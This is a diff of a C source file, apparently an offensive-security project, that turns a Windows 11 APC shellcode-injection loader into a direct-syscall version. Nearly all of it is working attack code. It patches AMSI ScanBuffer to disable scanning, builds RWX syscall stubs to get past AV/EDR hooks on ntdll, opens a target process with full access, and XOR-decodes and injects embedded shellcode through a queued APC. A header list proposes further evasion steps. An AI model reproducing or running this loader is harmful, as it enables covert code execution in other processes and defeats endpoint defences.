@@ -1,6 +1,12 @@
 // 0xtengu    
-// native apc injection                                   
+// native apc syscall injection                               
 // Windows 11 24H2 - 26100
+
+// Taking it forward: 
+// use PEB walking
+// avoid RWX in buildSyscallStub
+// hijack existing alertable thread
+// use syscalls from shadow copies
 
 #include <windows.h>
 #include <tlhelp32.h>
@@ -48,8 +54,8 @@ Credit: mr. d0x
    AMSI ScanBuffer patcher: toggles a conditional jump (JE <-> JNE)
    enable = TRUE: patch JE -> JNE (bypass AMSI)
    enable = FALSE: restore original JE
-    could technically hit some crazy edge case where the je isn’t
-    in the first 0x1000 bytes or the opcode isn’t exactly 0x74
+    could technically hit some crazy edge case where the je isnâ€™t
+    in the first 0x1000 bytes or the opcode isnâ€™t exactly 0x74
 ---------------------------------------------------------------- */
 // patch or restore the amsi scan buffer je instruction
 BOOL PatchAmsiScanBuffer(BOOL enable)
@@ -60,7 +66,7 @@ BOOL PatchAmsiScanBuffer(BOOL enable)
     // first call: find the je we want to flip
     if (!patch_loc)
     {
-        // load amsi.dll if it isn’t already
+        // load amsi.dll if it isnâ€™t already
         HMODULE hamsi = LoadLibraryW(L"amsi.dll");
         if (!hamsi)
             return FALSE;
@@ -107,6 +113,91 @@ BOOL PatchAmsiScanBuffer(BOOL enable)
     return TRUE;
 }
 
+// ----[ extract syscalls ]---------------------------------------------------
+
+// this function grabs the syscall number 
+// from a given ntdll function like "NtWriteVirtualMemory" 
+DWORD ExtractSyscallNumber(LPCSTR funcName)
+{
+    // load ntdll.dll from the current process (already mapped in)
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return 0; // bail if we can't find it
+
+    // get the address of the function we're trying to inspect
+    BYTE* p = (BYTE*)GetProcAddress(hNtdll, funcName);
+    if (!p) return 0; // if it's not exported, we can't do much
+
+    // look at the first 64 bytes of the function's prologue
+    // typical syscall stubs start with: 
+    //     mov r10, rcx
+    //     mov eax, xx xx xx xx
+    //     syscall
+    // we're interested in grabbing that "mov eax, imm32" and reading the imm32
+    for (int i = 0; i < 64; i++)
+    {
+        // look for the "mov eax, imm32" opcode
+        if (p[i] == 0xB8) // 0xB8 = mov eax, immediate DWORD
+        {
+            // grab the dword right after it (syscall id)
+            DWORD id = *(DWORD*)(p + i + 1);
+
+            // check ahead a few bytes for the syscall instruction (0F 05)
+            // it's usually 5â€“20 bytes later due to things like mitigation checks
+            for (int j = i + 5; j < i + 45; j++)
+            {
+                // if we find 0F 05, then it's a real syscall stub
+                if (p[j] == 0x0F && p[j + 1] == 0x05)
+                    return id; // success! return the syscall number
+            }
+        }
+    }
+
+    // if we get here, we couldnâ€™t find the right pattern
+    // maybe itâ€™s a weird version of ntdll or heavily hooked
+    return 0;
+}
+
+// ----[ syscall builder ]---------------------------------------------------
+
+// builds a tiny chunk of executable memory that makes a direct syscall
+// basically: syscall stub generator on the fly
+void* buildSyscallStub(DWORD syscallId)
+{
+    // this is our raw syscall stub in bytes
+    // it sets up the registers and makes the syscall
+    BYTE stub[] = {
+        0x4C, 0x8B, 0xD1,               // mov r10, rcx         ; copy rcx to r10 (syscall ABI)
+        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscallId   ; weâ€™ll patch this below
+        0x0F, 0x05,                     // syscall              ; call into kernel
+        0xC3                            // ret                  ; return cleanly
+    };
+
+    // now patch the syscall ID into the stub (overwrites 0x00s in mov eax, XX)
+    *(DWORD*)(stub + 4) = syscallId;
+
+    // allocate some executable memory for our stub to live in
+    void* exec = VirtualAlloc(
+        NULL,                           // let the OS choose the address
+        sizeof(stub),                   // just enough for the stub
+        MEM_COMMIT | MEM_RESERVE,      // allocate + commit in one go
+        PAGE_EXECUTE_READWRITE         // mark it executable
+    );
+
+    // if allocation failed, just bail
+    if (!exec) return NULL;
+
+    // copy our stub into the allocated space
+    memcpy(exec, stub, sizeof(stub));
+
+    // flush the CPU instruction cache to make sure our stub gets executed properly
+    // (some CPUs will still see stale instructions otherwise)
+    FlushInstructionCache(GetCurrentProcess(), exec, sizeof(stub));
+
+    // and return the address â€” ready to cast & call!
+    return exec;
+}
+
+
 /// ---[ NT ]-----------------------------------------
 #ifndef NT_SUCCESS
 // ntstatus codes can be weird, so this macro just checks if the status is non-negative
@@ -114,12 +205,12 @@ BOOL PatchAmsiScanBuffer(BOOL enable)
 #endif
 
 #ifndef THREAD_CREATE_FLAGS_CREATE_SUSPENDED
-// create thread suspended flag isn’t always in the sdk, so we define it here
+// create thread suspended flag isnâ€™t always in the sdk, so we define it here
 #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001UL
 #endif
 
 #ifndef QUEUE_USER_APC_SPECIAL_USER_APC
-// special apc flag for queueing apcs, again some sdk’s omit it
+// special apc flag for queueing apcs, again some sdkâ€™s omit it
 #define QUEUE_USER_APC_SPECIAL_USER_APC ((HANDLE)0x1)
 #endif
 
@@ -133,14 +224,13 @@ typedef VOID(NTAPI* PPS_APC_ROUTINE)(
     PCONTEXT ContextRecord
     );
 
-typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemoryEx)(
-    HANDLE ProcessHandle,
+typedef NTSTATUS(*pNtAllocateVirtualMemory)(
+    HANDLE       ProcessHandle,
     PVOID* BaseAddress,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG PageProtection,
-    PMEM_EXTENDED_PARAMETER ExtendedParameters,
-    ULONG ExtendedParameterCount
+    ULONG_PTR    ZeroBits,
+    PSIZE_T      RegionSize,
+    ULONG        AllocationType,
+    ULONG        Protect
     );
 
 // write virtual memory directly into another process
@@ -194,7 +284,7 @@ typedef NTSTATUS(NTAPI* pNtAlertResumeThread)(
 // ----[ resolved pointers ]---------------------------------------------------
 
 // pointers to hold the real ntdll functions once we find them
-static pNtAllocateVirtualMemoryEx  _NtAllocateVirtualMemoryEx = NULL;
+static pNtAllocateVirtualMemory  _NtAllocateVirtualMemory = NULL;
 static pNtWriteVirtualMemory       _NtWriteVirtualMemory = NULL;
 static pNtProtectVirtualMemory     _NtProtectVirtualMemory = NULL;
 static pNtCreateThreadEx           _NtCreateThreadEx = NULL;
@@ -204,285 +294,337 @@ static pNtAlertResumeThread        _NtAlertResumeThread = NULL;
 static PPS_APC_ROUTINE             _RtlDispatchAPC = NULL;
 static PVOID                       _RtlExitUserThread = NULL;
 
+// ----[ resolve ntdll api's ]---------------------------------------------------
+
 // this function grabs all the ntdll exports we need, returns true if successful
 static BOOL ResolveNtdllApis(void)
 {
-    // get handle to ntdll (our source of power)
+    // get handle to ntdll (needed for name resolution and parsing syscall IDs)
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll)
         return FALSE;
 
-    // for each pointer, if it’s not set yet, fetch it by name
-    if (!_NtAllocateVirtualMemoryEx)
-        _NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)
-        GetProcAddress(hNtdll, "NtAllocateVirtualMemoryEx");
+    if (!_NtAllocateVirtualMemory)
+    {
+        DWORD id = ExtractSyscallNumber("NtAllocateVirtualMemory");
+        if (!id)
+        {
+            printf("[-] Failed to find syscall ID for NtAllocateVirtualMemory\n");
+            return FALSE;
+        }
+        _NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)buildSyscallStub(id);
+    }
 
     if (!_NtWriteVirtualMemory)
-        _NtWriteVirtualMemory = (pNtWriteVirtualMemory)
-        GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    {
+        DWORD id = ExtractSyscallNumber("NtWriteVirtualMemory");
+        if (!id)
+        {
+            printf("[-] Failed to parse syscall ID\n"); return FALSE;
+        }
+        _NtWriteVirtualMemory = (pNtWriteVirtualMemory)buildSyscallStub(id);
+
+    }
 
     if (!_NtProtectVirtualMemory)
-        _NtProtectVirtualMemory = (pNtProtectVirtualMemory)
-        GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+    {
+        DWORD id = ExtractSyscallNumber("NtProtectVirtualMemory");
+        _NtProtectVirtualMemory = (pNtProtectVirtualMemory)buildSyscallStub(id);
+    }
 
     if (!_NtCreateThreadEx)
-        _NtCreateThreadEx = (pNtCreateThreadEx)
-        GetProcAddress(hNtdll, "NtCreateThreadEx");
+    {
+        DWORD id = ExtractSyscallNumber("NtCreateThreadEx");
+        if (!id)
+        {
+            printf("[-] Failed to get syscall ID for NtCreateThreadEx\n");
+            return FALSE;
+        }
+        _NtCreateThreadEx = (pNtCreateThreadEx)buildSyscallStub(id);
+    }
 
     if (!_NtQueueApcThread)
-        _NtQueueApcThread = (pNtQueueApcThread)
-        GetProcAddress(hNtdll, "NtQueueApcThread");
+    {
+        DWORD id = ExtractSyscallNumber("NtQueueApcThread");
+        if (!id)
+        {
+            printf("[-] Failed to get syscall ID for NtQueueApcThread\n");
+            return FALSE;
+        }
+        _NtQueueApcThread = (pNtQueueApcThread)buildSyscallStub(id);
+    }
 
+    // NtAlertResumeThread is usually not hooked, safe to resolve by name
     if (!_NtAlertResumeThread)
         _NtAlertResumeThread = (pNtAlertResumeThread)
         GetProcAddress(hNtdll, "NtAlertResumeThread");
 
-    // try to grab the rtl dispatch apc function by name first
-    // this is what windows uses internally to run queued apcs
+
+    //-------[ RtlDispatchAPC ]-------------------
+
+        // attempt to resolve the internal function RtlDispatchAPC from ntdll.dll
+        // This function is not officially documented, but is critical
+        // for dispatching a queued APC in user-mode.
+        // Windows internally uses this to actually run APC routines once they've
+        // been queued to a thread, it's the mechanism that invokes the shellcode
+        // or payload when using APC-based injection.
     if (!_RtlDispatchAPC)
     {
-        // get it by its usual exported name
+        // first, try to resolve it by name, this works if the export table
+        // has not been stripped or obfuscated by the system or AV/EDR hooks
         _RtlDispatchAPC = (PPS_APC_ROUTINE)GetProcAddress(hNtdll, "RtlDispatchAPC");
-        // if for some reason that export is hidden, windows sometimes exposes it by ordinal 8
+
+        // If the named export is unavailable (e.g., on some builds or hardened systems),
+        // fall back to resolving it by ordinal #8. This ordinal corresponds
+        // to RtlDispatchAPC in many versions of ntdll.dll
+
+        // Note: Using ordinals is more fragile, but useful whwere stealth
+        // and fallback strategies are needed to avoid detection.
         if (!_RtlDispatchAPC)
             _RtlDispatchAPC = (PPS_APC_ROUTINE)GetProcAddress(hNtdll, (LPCSTR)8);
     }
 
-    // next, grab the function that cleanly exits a user thread
-    // this helps us bail out of a thread once our payload is done
+    // Resolve 'RtlExitUserThread', another internal ntdll function
+    // Purpose: This cleanly terminates the current thread, similar to ExitThread(),
+    // but is a lower-level, more direct method often used,
+    // when trying to avoid the higher-level Windows API
+    // to reduce detection surface 
+    // Useful at the end of a payload execution to gracefully exit the thread that
+    // executed the injected code
     if (!_RtlExitUserThread)
         _RtlExitUserThread = GetProcAddress(hNtdll, "RtlExitUserThread");
 
-    // at this point we’ve tried resolving all the apis we need
-    // return true only if every single pointer is non-null
-    return _NtAllocateVirtualMemoryEx && _NtWriteVirtualMemory &&
+    // Final validation step:
+    // Return true only if all required function pointers have been successfully
+    // resolved from ntdll.dll
+    // Failing to resolve any of them means the loader is missing a critical
+    // building block, and execution should not continue
+    return _NtAllocateVirtualMemory && _NtWriteVirtualMemory &&
         _NtProtectVirtualMemory && _NtCreateThreadEx &&
         _NtQueueApcThread && _NtAlertResumeThread &&
         _RtlDispatchAPC && _RtlExitUserThread;
 }
 
-    // ===[ Process Handle Lookup ]==
-    BOOL OpenProcessByName(LPCWSTR targetName, DWORD * outPid, HANDLE * outHandle)
+// ----[ Process Handle Lookup ]-------------------------------------------------
+BOOL OpenProcessByName(LPCWSTR targetName, DWORD* outPid, HANDLE* outHandle)
+{
+    if (!targetName || !outPid || !outHandle)
     {
-        if (!targetName || !outPid || !outHandle)
-        {
-            printf("[ERROR] OpenProcessByName: invalid argument(s)\n");
-            return FALSE;
-        }
+        printf("[ERROR] OpenProcessByName: invalid argument(s)\n");
+        return FALSE;
+    }
 
-        *outPid = 0;
-        *outHandle = NULL;
+    *outPid = 0;
+    *outHandle = NULL;
 
-        HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (snapshotHandle == INVALID_HANDLE_VALUE)
-        {
-            printf("[ERROR] CreateToolhelp32Snapshot failed (err=%lu)\n", GetLastError());
-            return FALSE;
-        }
+    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshotHandle == INVALID_HANDLE_VALUE)
+    {
+        printf("[ERROR] CreateToolhelp32Snapshot failed (err=%lu)\n", GetLastError());
+        return FALSE;
+    }
 
-        PROCESSENTRY32W processEntry = { sizeof(processEntry) };
+    PROCESSENTRY32W processEntry = { sizeof(processEntry) };
 
-        if (!Process32FirstW(snapshotHandle, &processEntry))
-        {
-            printf("[ERROR] Process32FirstW failed (err=%lu)\n", GetLastError());
-            CloseHandle(snapshotHandle);
-            return FALSE;
-        }
-
-        do {
-            if (_wcsicmp(processEntry.szExeFile, targetName))
-                continue;
-
-            *outPid = processEntry.th32ProcessID;
-            *outHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *outPid);
-
-            if (!*outHandle)
-            {
-                printf("[ERROR] OpenProcess PID %lu failed (err=%lu)\n",
-                    *outPid, GetLastError());
-                CloseHandle(snapshotHandle);
-                return FALSE;
-            }
-
-            printf("[INFO] Opened %ws [PID %lu]\n", targetName, *outPid);
-            CloseHandle(snapshotHandle);
-            return TRUE;
-
-        } while (Process32NextW(snapshotHandle, &processEntry));
-
-        printf("[WARN] Process \"%ws\" not found\n", targetName);
+    if (!Process32FirstW(snapshotHandle, &processEntry))
+    {
+        printf("[ERROR] Process32FirstW failed (err=%lu)\n", GetLastError());
         CloseHandle(snapshotHandle);
         return FALSE;
     }
 
-    /* ----[ injectAPC ]------------------------------------------------------------------
-      apc injection using nt syscalls
-      remotely injects and executes shellcode buffer via apc on a target process handle
-    ------------------------------------------------------------------------------------ */
-    static BOOL injectAPC(HANDLE hp, unsigned char* buf, SIZE_T len)
-    {
-        // resolve all raw ntdll syscall pointers we need:
-        //  alloc, write, protect, create thread, queue apc, resume thread
-        // if any of these fail, we cannot inject
-        if (!ResolveNtdllApis())
-            return FALSE;
+    do {
+        if (_wcsicmp(processEntry.szExeFile, targetName))
+            continue;
 
-        // 1) allocate a read/write region in the target process
-        //    remote will receive the base address of the allocation
-        //    region is the size we want (len bytes)
-        PVOID remote = NULL;
-        SIZE_T region = len;
-        NTSTATUS st = _NtAllocateVirtualMemoryEx(
-            hp,                             // target process handle
-            &remote,                        // out: allocated base address
-            &region,                        // in/out: requested size
-            MEM_COMMIT | MEM_RESERVE,       // commit pages + reserve address space
-            PAGE_READWRITE,                 // allow read/write so we can copy payload
-            NULL,                           // no extended parameters
-            0);
-        if (!NT_SUCCESS(st) || !remote)
+        *outPid = processEntry.th32ProcessID;
+        *outHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *outPid);
+
+        if (!*outHandle)
         {
-            // allocation failed or returned null pointer
-            printf("[-] NtAllocateVirtualMemoryEx failed: 0x%08X\n", st);
+            printf("[ERROR] OpenProcess PID %lu failed (err=%lu)\n",
+                *outPid, GetLastError());
+            CloseHandle(snapshotHandle);
             return FALSE;
         }
 
-        // 2) write the payload buffer into the newly allocated memory
-        //    written will hold how many bytes were actually written
-        SIZE_T written = 0;
-        st = _NtWriteVirtualMemory(
-            hp,        // target process handle
-            remote,    // destination in remote process
-            buf,       // local buffer containing our payload
-            len,       // number of bytes to write
-            &written); // out: actual bytes written
-        if (!NT_SUCCESS(st) || written != len)
-        {
-            // either syscall failed or only partial write happened
-            printf("[-] NtWriteVirtualMemory failed: 0x%08X (wrote %llu/%llu)\n",
-                st, (unsigned long long)written, (unsigned long long)len);
-            return FALSE;
-        }
-
-        // 3) change the memory protection to execute/read
-        //    so the cpu can execute the shellcode but not modify it
-        ULONG oldProt = 0;
-        PVOID base = remote;
-        SIZE_T size = region;
-        st = _NtProtectVirtualMemory(
-            hp,                   // target process handle
-            &base,                // in/out: base address of region
-            &size,                // in/out: size of region
-            PAGE_EXECUTE_READ,    // new protection flags
-            &oldProt);            // out: previous protection
-        if (!NT_SUCCESS(st))
-        {
-            printf("[-] NtProtectVirtualMemory failed: 0x%08X\n", st);
-            return FALSE;
-        }
-
-        // 4) create a new thread in the remote process in suspended state
-        //    we set its start routine to rtlExitUserThread so it will exit
-        //    after our apc has run
-        HANDLE th = NULL;
-        st = _NtCreateThreadEx(
-            &th,                          // out: new thread handle
-            THREAD_ALL_ACCESS,            // full access rights
-            NULL,                         // no special object attrs
-            hp,                           // process handle to create thread in
-            _RtlExitUserThread,           // start routine: exit immediately
-            0,                            // argument to exit routine (ignored)
-            THREAD_CREATE_FLAGS_CREATE_SUSPENDED, // create suspended
-            0, 0, 0,                      // zero bits, stack sizes, attr list
-            NULL);
-        if (!NT_SUCCESS(st) || !th)
-        {
-            printf("[-] NtCreateThreadEx failed: 0x%08X\n", st);
-            return FALSE;
-        }
-
-        // 5) queue an apc on the suspended thread
-        //    use RtlDispatchAPC so that when the thread resumes it will run our payload
-        st = _NtQueueApcThread(
-            th,              // target thread handle
-            _RtlDispatchAPC, // system routine to dispatch the apc
-            remote,          // first arg: pointer to our shellcode
-            NULL, NULL);     // other args not used
-        if (!NT_SUCCESS(st))
-        {
-            // apc queue failed, clean up and abort
-            printf("[-] NtQueueApcThread failed: 0x%08X\n", st);
-            CloseHandle(th);
-            return FALSE;
-        }
-
-        // 6) resume the thread and alert it
-        //    this drops the suspend count so the apc fires before any normal thread start
-        ULONG prev = 0;
-        st = _NtAlertResumeThread(
-            th,   // thread to resume
-            &prev // out: previous suspend count
-        );
-        if (!NT_SUCCESS(st))
-        {
-            printf("[-] NtAlertResumeThread failed: 0x%08X\n", st);
-            CloseHandle(th);
-            return FALSE;
-        }
-
-        // success: apc is queued and shellcode should execute immediately
-        printf("[+] APC queued; thread resumed (prev suspend count %lu)\n", prev);
-        CloseHandle(th);
+        printf("[INFO] Opened %ws [PID %lu]\n", targetName, *outPid);
+        CloseHandle(snapshotHandle);
         return TRUE;
+
+    } while (Process32NextW(snapshotHandle, &processEntry));
+
+    printf("[WARN] Process \"%ws\" not found\n", targetName);
+    CloseHandle(snapshotHandle);
+    return FALSE;
+}
+
+/* ----[ injectAPC ]------------------------------------------------------------------
+  apc injection using nt syscalls
+  remotely injects and executes shellcode buffer via apc on a target process handle
+------------------------------------------------------------------------------------ */
+static BOOL injectAPC(HANDLE hp, unsigned char* buf, SIZE_T len)
+{
+    // resolve all raw ntdll syscall pointers we need:
+    //  alloc, write, protect, create thread, queue apc, resume thread
+    // if any of these fail, we cannot inject
+    if (!ResolveNtdllApis())
+        return FALSE;
+
+    // 1) allocate a read/write region in the target process
+    //    remote will receive the base address of the allocation
+    //    region is the size we want (len bytes)
+    PVOID remote = NULL;
+    SIZE_T region = len;
+    NTSTATUS st = _NtAllocateVirtualMemory(
+        hp,                // target process handle
+        &remote,           // output: base address
+        0,                 // ZeroBits (typically 0)
+        &region,           // input/output: size
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    if (!NT_SUCCESS(st) || !remote)
+    {
+        // allocation failed or returned null pointer
+        printf("[-] NtAllocateVirtualMemory failed: 0x%08X\n", st);
+        return FALSE;
     }
 
-    //////////////////////////////////////
-    //  Main      ///////////////////////
-    ////////////////////////////////////
-    int wmain(void)
+    // 2) write the payload buffer into the newly allocated memory
+    //    written will hold how many bytes were actually written
+    SIZE_T written = 0;
+    st = _NtWriteVirtualMemory(
+        hp,        // target process handle
+        remote,    // destination in remote process
+        buf,       // local buffer containing our payload
+        len,       // number of bytes to write
+        &written); // out: actual bytes written
+    if (!NT_SUCCESS(st) || written != len)
     {
-        puts("[*] Starting APC injection");
+        // either syscall failed or only partial write happened
+        printf("[-] NtWriteVirtualMemory failed: 0x%08X (wrote %llu/%llu)\n",
+            st, (unsigned long long)written, (unsigned long long)len);
+        return FALSE;
+    }
 
-        // AMSI patch
-        if (!PatchAmsiScanBuffer(TRUE))
-        {
-            puts("[-] AMSI patch failed");
-            return 1;
-        }
-        puts("[+] AMSI bypass enabled");
+    // 3) change the memory protection to execute/read
+    //    so the cpu can execute the shellcode but not modify it
+    ULONG oldProt = 0;
+    PVOID base = remote;
+    SIZE_T size = region;
+    st = _NtProtectVirtualMemory(
+        hp,                   // target process handle
+        &base,                // in/out: base address of region
+        &size,                // in/out: size of region
+        PAGE_EXECUTE_READ,    // new protection flags
+        &oldProt);            // out: previous protection
+    if (!NT_SUCCESS(st))
+    {
+        printf("[-] NtProtectVirtualMemory failed: 0x%08X\n", st);
+        return FALSE;
+    }
 
-        // find target process
-        DWORD pid; HANDLE hProc;
-        if (!OpenProcessByName(TARGET_PROCESS_NAME, &pid, &hProc))
-        {
-            puts("[-] Target not found");
-            PatchAmsiScanBuffer(FALSE);
-            return 1;
-        }
-        printf("[+] Target %ws found\n[i]PID:    %lu\n[i]HANDLE: 0x%p\n",
-            TARGET_PROCESS_NAME, pid, hProc);
+    // 4) create a new thread in the remote process in suspended state
+    //    we set its start routine to rtlExitUserThread so it will exit
+    //    after our apc has run
+    HANDLE th = NULL;
+    st = _NtCreateThreadEx(
+        &th,                          // out: new thread handle
+        THREAD_ALL_ACCESS,            // full access rights
+        NULL,                         // no special object attrs
+        hp,                           // process handle to create thread in
+        _RtlExitUserThread,           // start routine: exit immediately
+        0,                            // argument to exit routine (ignored)
+        THREAD_CREATE_FLAGS_CREATE_SUSPENDED, // create suspended
+        0, 0, 0,                      // zero bits, stack sizes, attr list
+        NULL);
+    if (!NT_SUCCESS(st) || !th)
+    {
+        printf("[-] NtCreateThreadEx failed: 0x%08X\n", st);
+        return FALSE;
+    }
 
-        // decode payload
-        xor(shellcode, sizeof(shellcode), key);
-        puts("[+] Shellcode decoded");
-        printf("[+] Local shellcode buffer: 0x%p (%zu bytes)\n", shellcode, sizeof(shellcode));
+    // 5) queue an apc on the suspended thread
+    //    use RtlDispatchAPC so that when the thread resumes it will run our payload
+    st = _NtQueueApcThread(
+        th,              // target thread handle
+        _RtlDispatchAPC, // system routine to dispatch the apc
+        remote,          // first arg: pointer to our shellcode
+        NULL, NULL);     // other args not used
+    if (!NT_SUCCESS(st))
+    {
+        // apc queue failed, clean up and abort
+        printf("[-] NtQueueApcThread failed: 0x%08X\n", st);
+        CloseHandle(th);
+        return FALSE;
+    }
 
-        printf("[*] Press Enter to inject"); getchar();
+    // 6) resume the thread and alert it
+    //    this drops the suspend count so the apc fires before any normal thread start
+    ULONG prev = 0;
+    st = _NtAlertResumeThread(
+        th,   // thread to resume
+        &prev // out: previous suspend count
+    );
+    if (!NT_SUCCESS(st))
+    {
+        printf("[-] NtAlertResumeThread failed: 0x%08X\n", st);
+        CloseHandle(th);
+        return FALSE;
+    }
 
-        //NT APC injection
-        if (!injectAPC(hProc, shellcode, sizeof(shellcode)))
-        {
-            puts("[-] injectAPC failed");
-            CloseHandle(hProc);
-            PatchAmsiScanBuffer(FALSE);
-            puts("[+] AMSI restored");
-            return 1;
-        }
+    // success: apc is queued and shellcode should execute immediately
+    printf("[+] APC queued; thread resumed (prev suspend count %lu)\n", prev);
+    CloseHandle(th);
+    return TRUE;
+}
 
-        puts("[+] Injection path complete");
+//////////////////////////////////////
+//  Main      ///////////////////////
+////////////////////////////////////
+int wmain(void)
+{
+    puts("[*] Starting APC injection");
+
+    // AMSI patch
+    if (!PatchAmsiScanBuffer(TRUE))
+    {
+        puts("[-] AMSI patch failed");
+        return 1;
+    }
+    puts("[+] AMSI bypass enabled");
+
+    // find target process
+    DWORD pid; HANDLE hProc;
+    if (!OpenProcessByName(TARGET_PROCESS_NAME, &pid, &hProc))
+    {
+        puts("[-] Target not found");
+        PatchAmsiScanBuffer(FALSE);
+        return 1;
+    }
+
+    // decode payload
+    xor (shellcode, sizeof(shellcode), key);
+    puts("[+] Shellcode decoded");
+    printf("[+] Local shellcode buffer: 0x%p (%zu bytes)\n", shellcode, sizeof(shellcode));
+
+    printf("[*] Press Enter to inject"); getchar();
+
+    //NT APC injection
+    if (!injectAPC(hProc, shellcode, sizeof(shellcode)))
+    {
+        puts("[-] injectAPC failed");
         CloseHandle(hProc);
-
         PatchAmsiScanBuffer(FALSE);
         puts("[+] AMSI restored");
-        return 0;
+        return 1;
     }
+
+    puts("[+] Injection path complete");
+    CloseHandle(hProc);
+
+    PatchAmsiScanBuffer(FALSE);
+    puts("[+] AMSI restored");
+    return 0;
+}
